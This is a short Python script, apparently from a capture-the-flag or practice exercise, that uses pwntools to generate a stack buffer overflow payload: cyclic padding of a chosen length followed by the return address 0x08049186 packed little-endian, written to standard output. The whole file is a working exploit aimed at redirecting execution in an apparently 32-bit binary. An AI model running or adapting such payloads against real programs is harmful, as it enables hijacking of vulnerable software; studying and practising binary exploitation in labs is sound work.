import pwnlib.util.cyclic
import sys

#address 08049186
len=int(sys.argv[1])
gen=pwnlib.util.cyclic.cyclic_gen()
base=gen.get(len)
payload=base
payload+=b"\x08\x04\x91\x86"[::-1]
#payload+=b"\x08\x04\x91\x86"
sys.stdout.buffer.write(payload)
